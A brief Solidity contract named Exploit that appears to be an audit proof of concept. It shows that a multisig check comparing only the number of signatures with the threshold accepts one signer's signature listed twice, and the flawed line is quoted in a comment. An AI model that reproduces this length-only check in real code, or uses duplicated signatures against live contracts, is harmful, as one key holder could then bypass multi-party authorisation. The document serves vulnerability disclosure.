// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Exploit { bool public accepted; uint256 public uniqueSigners; event Proof(uint256 supplied,uint256 unique);
    function run() external { uint256 threshold=2; address signer=address(0xBEEF); address[] memory signatures=new address[](2); signatures[0]=signer; signatures[1]=signer;
        // @> if (signatures.length == 0 || signatures.length < $.threshold) return false;
        accepted=signatures.length>=threshold; uniqueSigners=1; emit Proof(signatures.length,uniqueSigners); require(accepted&&uniqueSigners<threshold,"dedup check"); }
}
